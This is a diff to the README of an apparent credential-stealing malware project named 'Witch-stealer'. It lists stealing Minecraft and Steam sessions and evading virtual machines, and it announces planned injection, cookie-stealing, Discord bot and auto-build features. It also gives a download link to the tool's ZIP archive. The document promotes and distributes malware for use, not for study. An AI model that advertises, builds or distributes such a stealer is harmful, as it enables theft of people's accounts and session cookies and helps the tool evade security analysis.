@@ -45,13 +45,14 @@
   - 🎮️ Game
     - Minecraft Session
     - Steam Session
-  - 🚫 Anti
+  - 🚫 ANTI VM
     - Anti Vm
     
 ---
 # ⚙️ Coming Soon Feature!✨️
 - 💉 ALL
-  - Discord webhook=❌️ Discord Bot=✅️
+  - Discord Bot
+  - Auto Build
   - Injection
   - Cookie Steal
 
@@ -70,7 +71,7 @@
 > Having trouble reading? Then the developer has a tutorial video for you. You can access them by [click here](https://www.youtube.com/watch?v=dQw4w9WgXcQ)
 ---
 > [!NOTE]
-> Did you encounter an error? Certain operations may require administrative privileges.
+> Did an error occur? If you have a GitHub account, please consider opening an issue. We’ll do our best to improve.
 
 - **🔩 Installation Tutorial**  
 To get started, [click here](https://github.com/addadi000/Witch-stealer/archive/refs/heads/main.zip) to download the ZIP file.<br>
